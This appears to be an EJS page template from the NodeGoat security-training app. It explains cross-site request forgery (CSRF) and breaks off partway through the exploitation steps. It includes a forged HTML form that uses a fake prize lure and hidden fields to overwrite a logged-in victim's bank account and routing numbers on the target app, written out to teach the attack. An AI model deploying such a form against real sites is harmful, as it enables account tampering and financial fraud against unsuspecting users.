<% layout('layout') %> <% var title = "A8-Cross-Site Request Forgery (CSRF)"; %>

<div class="row">
  <div class="col-lg-12">
    <div class="bs-example" style="margin-bottom: 40px">
      <span class="label label-warning">Exploitability: AVERAGE</span>
      <span class="label label-warning">Prevalence: COMMON</span>
      <span class="label label-danger">Detectability: EASY</span>
      <span class="label label-warning">Technical Impact: MODERATE</span>
    </div>
  </div>
</div>

<div class="row">
  <div class="col-lg-12">
    <div class="panel panel-info">
      <div class="panel-heading">
        <h3 class="panel-title">Description</h3>
      </div>
      <div class="panel-body">
        A CSRF attack forces a logged-on victim’s browser to send a forged HTTP
        request, including the victim’s session cookie and any other
        automatically included authentication information, to a vulnerable web
        application. This allows the attacker to force the victim’s browser to
        generate requests that the vulnerable application processes as
        legitimate requests from the victim.
      </div>
    </div>
    <!--
    <div class="panel panel-info">
      <div class="panel-heading">
        <h3 class="panel-title">Real World Attack Incident Examples</h3>
      </div>
      <div class="panel-body">
        Screencast here ...
      </div>
    </div>
    -->
    <div class="panel panel-info">
      <div class="panel-heading">
        <h3 class="panel-title">Attack Mechanics</h3>
      </div>
      <div class="panel-body">
        <p>
          As browsers automatically send credentials like session cookies with
          HTTP requests to the server where cookies were received from,
          attackers can create malicious web pages which generate forged
          requests that are indistinguishable from legitimate ones.
        </p>
        <p>
          For example, CSRF vulnerability can be exploited on a profile form in
          the insecure demo application.
        </p>
        <iframe
          width="560"
          height="315"
          src="//www.youtube.com/embed/vRDykS_2y3I?rel=0"
          frameborder="0"
          allowfullscreen
        ></iframe>
        <p>To exploit it:</p>
        <ol>
          <li>
            An attacker would need to host a forged form like below on a
            malicious server.
            <pre>
&lt;html lang="en"&gt;
&lt;head&gt;&lt;/head&gt;
  &lt;body&gt;
    &lt;form method="POST" action="http://TARGET_APP_URL_HERE/profile"&gt;
      &lt;h1&gt; You are about to win a brand new iPhone!&lt;/h1&gt;
      &lt;h2&gt; Click on the win button to claim it...&lt;/h2&gt;
      &lt;input type="hidden" name="bankAcc" value="9999999"/&gt;
      &lt;input type="hidden" name="bankRouting" value="88888888"/&gt;
      &lt;input type="submit" value="Win !!!"/&gt;
    &lt;/form&gt;
  &lt;/body&gt;
&lt;/html&gt;
            </pre>
            Note: A sample app containing a form for CSRF attack on NodeGoat app
            is available
            <a
              target="_blank"
              href="https://github.com/ckarande/nodegoat-csrf-attack"
              >here</a
            >.
          </li>
          <li>Next, the attacker would need</li>
        </ol>
      </div>
    </div>
  </div>
</div>
